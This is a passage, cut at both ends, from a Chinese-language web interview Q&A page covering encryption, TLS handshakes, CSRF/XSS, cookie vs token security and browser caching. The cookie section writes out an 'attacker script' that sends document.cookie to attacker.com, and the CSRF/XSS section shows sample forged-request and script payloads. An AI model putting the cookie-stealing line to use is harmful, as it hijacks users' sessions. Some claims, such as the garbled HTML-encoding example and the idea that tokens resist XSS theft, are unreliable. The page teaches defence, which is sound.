Cryptography）</li><li>DSA</li><li>ElGamal</li></ul></li><li><p><strong>使用场景：</strong></p><ul><li>数字签名</li><li>密钥交换</li><li>身份认证</li><li>小数据量加密</li></ul></li><li><p><strong>优点：</strong></p><ul><li>密钥分发安全</li><li>可以实现数字签名</li><li>密钥管理简单</li><li>支持身份认证</li></ul></li><li><p><strong>缺点：</strong></p><ul><li>加密解密速度慢</li><li>不适合大数据量</li><li>算法复杂</li></ul></li></ul><p><strong>区别总结：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>对称加密</th><th>非对称加密</th></tr></thead><tbody><tr><td>密钥</td><td>加密解密同一密钥</td><td>公钥和私钥</td></tr><tr><td>速度</td><td>快</td><td>慢</td></tr><tr><td>安全性</td><td>依赖密钥保护</td><td>依赖数学难题</td></tr><tr><td>密钥管理</td><td>复杂</td><td>简单</td></tr><tr><td>数字签名</td><td>不支持</td><td>支持</td></tr><tr><td>应用场景</td><td>数据加密</td><td>密钥交换、签名</td></tr></tbody></table><p><strong>实际应用 - HTTPS：</strong></p><ol><li>使用非对称加密进行密钥交换</li><li>使用交换的对称密钥进行数据传输</li><li>结合两者的优点</li></ol><hr><h2 id="_18、说一下加密握手的过程" tabindex="-1">18、说一下加密握手的过程？ <a class="header-anchor" href="#_18、说一下加密握手的过程" aria-label="Permalink to &quot;18、说一下加密握手的过程？&quot;">​</a></h2><p><strong>TLS/SSL 握手过程（以 RSA 为例）：</strong></p><p><strong>1. Client Hello</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：</span></span>
<span class="line"><span>- 支持的 TLS 版本（如 TLS 1.2、1.3）</span></span>
<span class="line"><span>- 支持的加密套件（如 TLS_RSA_WITH_AES_128_GCM_SHA256）</span></span>
<span class="line"><span>- 随机数（Client Random）</span></span>
<span class="line"><span>- 支持的压缩方法</span></span></code></pre></div><p><strong>2. Server Hello</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>服务端 → 客户端：</span></span>
<span class="line"><span>- 选择的 TLS 版本</span></span>
<span class="line"><span>- 选择的加密套件</span></span>
<span class="line"><span>- 随机数（Server Random）</span></span>
<span class="line"><span>- 选择压缩方法（或不压缩）</span></span></code></pre></div><p><strong>3. Certificate</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>服务端 → 客户端：</span></span>
<span class="line"><span>- 服务器的数字证书（包含公钥）</span></span>
<span class="line"><span>- 证书链</span></span></code></pre></div><p><strong>4. Server Key Exchange（可选）</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>服务端 → 客户端：</span></span>
<span class="line"><span>- 如果使用 Diffie-Hellman，发送 DH 参数</span></span></code></pre></div><p><strong>5. Server Hello Done</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>服务端 → 客户端：</span></span>
<span class="line"><span>- 握手消息结束</span></span></code></pre></div><p><strong>6. Client Key Exchange</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：</span></span>
<span class="line"><span>- 生成预主密钥（Pre-Master Secret）</span></span>
<span class="line"><span>- 使用服务器的公钥加密预主密钥</span></span>
<span class="line"><span>- 发送加密后的预主密钥</span></span></code></pre></div><p><strong>7. Certificate Verify（可选）</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：</span></span>
<span class="line"><span>- 如果需要客户端证书，发送客户端证书</span></span>
<span class="line"><span>- 证明客户端身份</span></span></code></pre></div><p><strong>8. Change Cipher Spec</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>双向：</span></span>
<span class="line"><span>- 通知对方后续消息将使用协商好的密钥加密</span></span></code></pre></div><p><strong>9. Finished</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>双向：</span></span>
<span class="line"><span>- 验证握手过程是否完整</span></span>
<span class="line"><span>- 使用协商好的密钥加密</span></span></code></pre></div><p><strong>10. 数据传输</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>- 使用会话密钥加密数据</span></span>
<span class="line"><span>- 会话密钥 = PRF(预主密钥 + Client Random + Server Random)</span></span></code></pre></div><p><strong>TLS 1.3 握手过程（简化）：</strong></p><p><strong>1. Client Hello</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：</span></span>
<span class="line"><span>- 支持的加密套件</span></span>
<span class="line"><span>- 密钥共享参数（支持 0-RTT）</span></span></code></pre></div><p><strong>2. Server Hello</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>服务端 → 客户端：</span></span>
<span class="line"><span>- 选择的加密套件</span></span>
<span class="line"><span>- 服务器的密钥共享参数</span></span>
<span class="line"><span>- 证书（可能一起发送）</span></span></code></pre></div><p><strong>3. (Encrypted Extensions) Finished</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>服务端 → 客户端：</span></span>
<span class="line"><span>- 加密的扩展信息</span></span>
<span class="line"><span>- Finished 消息</span></span></code></pre></div><p><strong>4. Finished</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：</span></span>
<span class="line"><span>- Finished 消息</span></span></code></pre></div><p><strong>TLS 1.3 优势：</strong></p><ul><li>握手时间减少（1-RTT）</li><li>支持 0-RTT（连接复用时）</li><li>移除了不安全的加密算法</li><li>更好的前向安全性</li></ul><hr><h2 id="_19、介绍一下-ssl-与-tls。" tabindex="-1">19、介绍一下 SSL 与 TLS。 <a class="header-anchor" href="#_19、介绍一下-ssl-与-tls。" aria-label="Permalink to &quot;19、介绍一下 SSL 与 TLS。&quot;">​</a></h2><p><strong>SSL（Secure Sockets Layer）：</strong></p><ul><li><p><strong>全称：</strong> Secure Sockets Layer</p></li><li><p><strong>开发者：</strong> Netscape 公司</p></li><li><p><strong>版本历史：</strong></p><ul><li>SSL 1.0：未公开发布</li><li>SSL 2.0：1995年发布，有严重安全漏洞</li><li>SSL 3.0：1996年发布，2014年被发现 POODLE 漏洞，现已弃用</li></ul></li><li><p><strong>问题：</strong></p><ul><li>存在安全漏洞</li><li>设计不够完善</li><li>已被 TLS 取代</li></ul></li></ul><p><strong>TLS（Transport Layer Security）：</strong></p><ul><li><strong>全称：</strong> Transport Layer Security</li><li><strong>开发者：</strong> IETF（互联网工程任务组）</li><li><strong>版本历史：</strong><ul><li>TLS 1.0：1999年发布，基于 SSL 3.0</li><li>TLS 1.1：2006年发布，修复了一些漏洞</li><li>TLS 1.2：2008年发布，支持更强的加密算法</li><li>TLS 1.3：2018年发布，重大改进，更快更安全</li></ul></li></ul><p><strong>TLS 1.3 特点：</strong></p><ul><li>移除了不安全的加密算法</li><li>握手时间减少（1-RTT）</li><li>支持 0-RTT</li><li>强制前向安全性</li><li>更好的密钥派生函数</li></ul><p><strong>区别：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>SSL</th><th>TLS</th></tr></thead><tbody><tr><td>开发者</td><td>Netscape</td><td>IETF</td></tr><tr><td>当前状态</td><td>已弃用</td><td>活跃</td></tr><tr><td>安全性</td><td>较差</td><td>更强</td></tr><tr><td>版本</td><td>1.0-3.0</td><td>1.0-1.3</td></tr><tr><td>兼容性</td><td>旧系统</td><td>新系统</td></tr></tbody></table><p><strong>关系：</strong></p><ul><li>TLS 是 SSL 的继任者</li><li>TLS 1.0 基于 SSL 3.0</li><li>通常说的 SSL 实际上是指 TLS</li><li>很多工具和库仍使用 SSL 名称（如 OpenSSL）</li></ul><p><strong>使用建议：</strong></p><ul><li>新项目使用 TLS 1.2 或 1.3</li><li>禁用 SSL 和 TLS 1.0、1.1</li><li>优先使用 TLS 1.3</li></ul><p><strong>配置示例：</strong></p><div class="language-nginx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">nginx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ssl_protocols </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">TLSv1.2 TLSv1.3;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ssl_ciphers </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384;</span></span></code></pre></div><hr><h2 id="_20、请描述一下-csrf-与-xss-的基本概念、攻击原理和防御措施。" tabindex="-1">20、请描述一下 CSRF 与 XSS 的基本概念、攻击原理和防御措施。 <a class="header-anchor" href="#_20、请描述一下-csrf-与-xss-的基本概念、攻击原理和防御措施。" aria-label="Permalink to &quot;20、请描述一下 CSRF 与 XSS 的基本概念、攻击原理和防御措施。&quot;">​</a></h2><p><strong>CSRF（Cross-Site Request Forgery，跨站请求伪造）：</strong></p><p><strong>基本概念：</strong></p><ul><li>攻击者诱导用户在已认证的网站上执行非本意的操作</li><li>利用用户的登录状态</li></ul><p><strong>攻击原理：</strong></p><ol><li>用户登录了受信任网站 A（Cookie 保存在浏览器）</li><li>用户访问恶意网站 B</li><li>网站 B 的页面包含对网站 A 的请求（如 <code>&lt;img src=&quot;https://a.com/transfer?to=attacker&amp;amount=1000&quot;&gt;</code>）</li><li>浏览器自动携带网站 A 的 Cookie</li><li>网站 A 认为是用户自愿发起的请求</li><li>请求执行成功</li></ol><p><strong>防御措施：</strong></p><ol><li><p><strong>CSRF Token</strong></p><ul><li>服务器生成随机 token</li><li>放在表单或请求头中</li><li>验证 token 是否正确</li></ul></li><li><p><strong>SameSite Cookie</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Set-Cookie: sessionid=xxx; SameSite=Strict</span></span></code></pre></div><ul><li>Strict：完全不发送跨站 Cookie</li><li>Lax：部分场景发送（默认）</li></ul></li><li><p><strong>验证 Referer</strong></p><ul><li>检查请求来源</li><li>确保来源可信</li></ul></li><li><p><strong>双重 Cookie</strong></p><ul><li>在 Cookie 和参数中都设置 token</li><li>两者比对验证</li></ul></li></ol><p><strong>XSS（Cross-Site Scripting，跨站脚本攻击）：</strong></p><p><strong>基本概念：</strong></p><ul><li>攻击者在网页中注入恶意脚本</li><li>脚本在用户浏览器中执行</li></ul><p><strong>XSS 分类：</strong></p><ol><li><p><strong>存储型 XSS</strong></p><ul><li>恶意脚本存储在服务器（数据库）</li><li>访问页面时执行</li><li>危害最大</li></ul></li><li><p><strong>反射型 XSS</strong></p><ul><li>恶意脚本通过 URL 参数传递</li><li>服务器反射回浏览器</li><li>需要用户点击链接</li></ul></li><li><p><strong>DOM 型 XSS</strong></p><ul><li>恶意脚本通过 DOM 修改执行</li><li>不经过服务器</li><li>纯客户端漏洞</li></ul></li></ol><p><strong>攻击原理：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>正常链接：https://example.com/search?q=hello</span></span>
<span class="line"><span>恶意链接：https://example.com/search?q=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</span></span></code></pre></div><p>页面直接渲染参数，脚本执行。</p><p><strong>防御措施：</strong></p><ol><li><p><strong>输入验证</strong></p><ul><li>过滤特殊字符（&lt; &gt; &quot; &#39; &amp;）</li><li>白名单验证</li></ul></li><li><p><strong>输出编码</strong></p><ul><li>HTML 编码：<code>&lt;</code> → <code>&lt;</code></li><li>URL 编码</li><li>JS 编码</li></ul></li><li><p><strong>Content Security Policy (CSP)</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Content-Security-Policy: default-src &#39;self&#39;</span></span></code></pre></div><ul><li>限制脚本来源</li><li>阻止内联脚本</li></ul></li><li><p><strong>HttpOnly Cookie</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Set-Cookie: sessionid=xxx; HttpOnly</span></span></code></pre></div><ul><li>防止 JavaScript 读取 Cookie</li></ul></li><li><p><strong>使用安全的 API</strong></p><ul><li><code>textContent</code> 代替 <code>innerHTML</code></li><li><code>setAttribute</code> 代替拼接字符串</li></ul></li></ol><p><strong>CSRF vs XSS：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>CSRF</th><th>XSS</th></tr></thead><tbody><tr><td>攻击目标</td><td>服务器</td><td>客户端</td></tr><tr><td>利用点</td><td>用户已登录状态</td><td>网站未过滤用户输入</td></tr><tr><td>执行位置</td><td>服务器</td><td>浏览器</td></tr><tr><td>Cookie</td><td>自动携带</td><td>可以获取（非 HttpOnly）</td></tr><tr><td>防御重点</td><td>Token、SameSite</td><td>输入过滤、输出编码、CSP</td></tr></tbody></table><hr><h2 id="_21、cookie-和-token-都存放在-header-里面-为什么只劫持前者" tabindex="-1">21、cookie 和 token 都存放在 header 里面，为什么只劫持前者？ <a class="header-anchor" href="#_21、cookie-和-token-都存放在-header-里面-为什么只劫持前者" aria-label="Permalink to &quot;21、cookie 和 token 都存放在 header 里面，为什么只劫持前者？&quot;">​</a></h2><p><strong>为什么 Cookie 容易被劫持而 Token 不容易：</strong></p><p><strong>1. 存储方式不同</strong></p><ul><li><p><strong>Cookie</strong>：浏览器自动管理</p><ul><li>每次请求自动携带</li><li>不需要手动设置</li><li>浏览器自动发送到同域名下</li></ul></li><li><p><strong>Token</strong>：需要手动管理</p><ul><li>存储在 localStorage、sessionStorage 或内存中</li><li>请求时需要手动添加到 Header</li><li>不会自动发送</li></ul></li></ul><p><strong>2. 自动发送机制</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// Cookie - 自动发送</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/api/user&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">); </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 自动携带 Cookie</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// Token - 手动发送</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/api/user&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  headers: {</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &#39;Authorization&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">`Bearer ${</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">token</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}`</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span></code></pre></div><p><strong>3. XSS 攻击影响</strong></p><ul><li><strong>Cookie</strong>：如果被劫持，可以获取整个 Cookie（包括 HttpOnly 的可能通过其他方式）</li><li><strong>Token</strong>：即使被 XSS 劫持，也需要知道如何使用（格式、位置等）</li></ul><p><strong>4. 跨域限制</strong></p><ul><li><strong>Cookie</strong>：可以通过 <code>withCredentials</code> 跨域携带</li><li><strong>Token</strong>：手动控制是否发送</li></ul><p><strong>5. Csrf 防御</strong></p><ul><li><strong>Cookie</strong>：容易受到 CSRF 攻击（自动发送）</li><li><strong>Token</strong>：不自动发送，不受 CSRF 影响</li></ul><p><strong>实际示例：</strong></p><p><strong>Cookie 劫持：</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 攻击者脚本</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> cookie</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> document.cookie;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;https://attacker.com/steal?cookie=&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> cookie);</span></span></code></pre></div><p><strong>Token 防御：</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 需要知道 Token 的存储位置</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 需要知道 Token 的使用方式</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 需要知道 API 地址</span></span></code></pre></div><p><strong>最佳实践：</strong></p><ol><li><p><strong>Cookie + HttpOnly + SameSite</strong></p><ul><li>防止 XSS 读取</li><li>防止 CSRF</li></ul></li><li><p><strong>Token + 短期有效</strong></p><ul><li>即使泄露，有效期短</li><li>可以随时失效</li></ul></li><li><p><strong>双 Token 机制</strong></p><ul><li>Access Token（短期）</li><li>Refresh Token（长期，存储在 HttpOnly Cookie）</li></ul></li></ol><hr><h2 id="_22、客户端缓存有几种方式-浏览器出现-from-disk、form-memory-的策略是什么" tabindex="-1">22、客户端缓存有几种方式？浏览器出现 from disk、form memory 的策略是什么？ <a class="header-anchor" href="#_22、客户端缓存有几种方式-浏览器出现-from-disk、form-memory-的策略是什么" aria-label="Permalink to &quot;22、客户端缓存有几种方式？浏览器出现 from disk、form memory 的策略是什么？&quot;">​</a></h2><p><strong>客户端缓存方式：</strong></p><p><strong>1. HTTP 缓存</strong></p><ul><li><p><strong>强缓存</strong></p><ul><li>Cache-Control</li><li>Expires</li></ul></li><li><p><strong>协商缓存</strong></p><ul><li>ETag</li><li>Last-Modified</li></ul></li></ul><p><strong>2. 浏览器缓存类型</strong></p><ul><li><strong>内存缓存（Memory Cache）</strong></li><li><strong>磁盘缓存（Disk Cache）</strong></li><li><strong>Service Worker 缓存</strong></li></ul><p><strong>3. 本地存储</strong></p><ul><li><p><strong>LocalStorage</strong></p><ul><li>持久化存储</li><li>容量 5-10MB</li><li>不随请求发送</li></ul></li><li><p><strong>SessionStorage</strong></p><ul><li>会话级存储</li><li>标签页关闭即清除</li><li>容量 5-10MB</li></ul></li><li><p><strong>IndexedDB</strong></p><ul><li>大量数据存储</li><li>支持事务</li><li>容量 50MB+</li></ul></li><li><p><strong>WebSQL</strong></p><ul><li>已废弃</li></ul></li></ul><p><strong>4. 应用缓存（App Cache）</strong></p><ul><li>已被 Service Worker 取代</li></ul><p><strong>浏览器缓存策略（from disk vs from memory）：</strong></p><p><strong>内存缓存（Memory Cache）：</strong></p><ul><li><p><strong>特点：</strong></p><ul><li>存储在内存中</li><li>访问速度最快</li><li>浏览器关闭即清除</li><li>容量有限</li></ul></li><li><p><strong>缓存内容：</strong></p><ul><li>当前页面正在使用的资源</li><li>预加载的资源</li><li>小文件（图片、脚本、样式）</li></ul></li><li><p><strong>策略：</strong></p><ul><li>频繁访问的资源优先</li><li>当前页面相关的资源</li><li>预解析的资源</li></ul></li></ul><p><strong>磁盘缓存（Disk Cache）：</strong></p><ul><li><p><strong>特点：</strong></p><ul><li>存储在硬盘中</li><li>访问速度较慢</li><li>浏览器关闭后仍然存在</li><li>容量较大</li></ul></li><li><p><strong>缓存内容：</strong></p><ul><li>大文件（视频、大图片）</li><li>不常用的资源</li><li>需要持久化的资源</li></ul></li><li><p><strong>策略：</strong></p><ul><li>设置了较长缓存时间的资源</li><li>体积较大的资源</li><li>不经常变动的资源</li></ul></li></ul><p><strong>缓存决策策略：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>1. 检查内存缓存</span></span>
<span class="line"><span>   ↓ 命中 → from memory cache</span></span>
<span class="line"><span>   ↓ 未命中</span></span>
<span class="line"><span></span></span>
<span class="line"><span>2. 检查磁盘缓存</span></span>
<span class="line"><span>   ↓ 命中 → from disk cache</span></span>
<span class="line"><span>   ↓ 未命中</span></span>
<span class="line"><span></span></span>
<span class="line"><span>3. 发送网络请求</span></span></code></pre></div><p><strong>内存缓存 vs 磁盘缓存：</strong></p><table tabindex="0"><thead><tr><th>特性</th><th>Memory Cache</th><th>Disk Cache</th></tr></thead><tbody><tr><td>速度</td><td>最快</td><td>较快</td></tr><tr><td>容量</td><td>小</td><td>大</td></tr><tr><td>持久性</td><td>浏览器关闭清除</td><td>持久保存</td></tr><tr><td>典型内容</td><td>小文件、当前页面资源</td><td>大文件、历史资源</td></tr><tr><td>优先级</td><td>高</td><td>低</td></tr></tbody></table><p><strong>影响缓存位置的因素：</strong></p><ol><li><p><strong>文件大小</strong></p><ul><li>小文件 → 内存缓存</li><li>大文件 → 磁盘缓存</li></ul></li><li><p><strong>访问频率</strong></p><ul><li>频繁访问 → 内存缓存</li><li>不常访问 → 磁盘缓存</li></ul></li><li><p><strong>缓存时间</strong></p><ul><li>短期 → 内存缓存</li><li>长期 → 磁盘缓存</li></ul></li><li><p><strong>资源类型</strong></p><ul><li>图片、脚本 → 内存缓存</li><li>视频、大文件 → 磁盘缓存</li></ul></li><li><p><strong>内存压力</strong></p><ul><li>内存紧张 → 淘汰到磁盘</li></ul></li></ol><p><strong>Chrome DevTools 显示：</strong></p><ul><li><strong>from memory cache</strong>：资源从内存缓存加载</li><li><strong>from disk cache</strong>：资源从磁盘缓存加载</li><li><strong>Size 列显示大小</strong></li></ul><p><strong>优化建议：</strong></p><ol><li>重要资源设置较短缓存时间</li><li>不常变动的资源设置较长缓存时间</li><li>使用 Service Worker 实现更灵活的缓存控制</li><li>合理使用 Cache-Control</li><li>大文件使用 CDN</li></ol><hr><h2 id="_23、说一下-https-获取加密密钥的过程。" tabindex="-1">23、说一下 https 获取加密密钥的过程。 <a class="header-anchor" href="#_23、说一下-https-获取加密密钥的过程。" aria-label="Permalink to &quot;23、说一下 https 获取加密密钥的过程。&quot;">​</a></h2><p><strong>HTTPS 密钥获取过程（基于 RSA）：</strong></p><p><strong>1. 客户端生成随机数</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Client Random = 32 字节随机数</span></span></code></pre></div><p><strong>2. 服务端生成随机数</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Server Random = 32 字节随机数</span></span></code></pre></div><p><strong>3. 客户端生成预主密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Pre-Master Secret = 48 字节随机数</span></span></code></pre></div><p><strong>4. 客户端加密预主密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>使用服务器的公钥加密 Pre-Master Secret</span></span>
<span class="line"><span>Encrypted Pre-Master Secret = Encrypt_RSA(Public_Key, Pre-Master Secret)</span></span></code></pre></div><p><strong>5. 发送加密的预主密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：Encrypted Pre-Master Secret</span></span></code></pre></div><p><strong>6. 服务端解密预主密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Pre-Master Secret = Decrypt_RSA(Private_Key, Encrypted Pre-Master Secret)</span></span></code></pre></div><p><strong>7. 双方生成主密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Master Secret = PRF(Pre-Master Secret + Client Random + Server Random)</span></span></code></pre></div><ul><li>PRF：伪随机函数</li><li>输入：预主密钥 + 两个随机数</li><li>输出：48 字节的主密钥</li></ul><p><strong>8. 生成会话密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>从 Master Secret 派生：</span></span>
<span class="line"><span>- 客户端加密密钥（Client Write Key）</span></span>
<span class="line"><span>- 服务端加密密钥（Server Write Key）</span></span>
<span class="line"><span>- 客户端 MAC 密钥（Client MAC Key）</span></span>
<span class="line"><span>- 服务端 MAC 密钥（Server MAC Key）</span></span>
<span class="line"><span>- 客户端 IV（Client Write IV）</span></span>
<span class="line"><span>- 服务端 IV（Server Write IV）</span></span></code></pre></div><p><strong>9. 使用会话密钥加密通信</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端发送数据：Encrypt(Client Write Key, Data)</span></span>
<span class="line"><span>服务端接收数据：Decrypt(Server Write Key, Data)</span></span></code></pre></div><p><strong>基于 ECDHE（椭圆曲线 Diffie-Hellman）：</strong></p><p><strong>1. 双方交换公钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端 → 服务端：Client Public Key</span></span>
<span class="line"><span>服务端 → 客户端：Server Public Key</span></span></code></pre></div><p><strong>2. 双方计算共享密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Shared Secret = ECDH(Private_Key, Peer_Public_Key)</span></span></code></pre></div><p><strong>3. 生成主密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Master Secret = PRF(Shared Secret + Client Random + Server Random)</span></span></code></pre></div><p><strong>4. 生成会话密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>同上，派生各种加密密钥</span></span></code></pre></div><p><strong>ECDHE 优势：</strong></p><ul><li>前向安全性：即使长期私钥泄露，也无法解密过去的通信</li><li>密钥交换更快</li></ul><p><strong>TLS 1.3 密钥派生：</strong></p><p><strong>1. 客户端发送密钥共享参数</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki 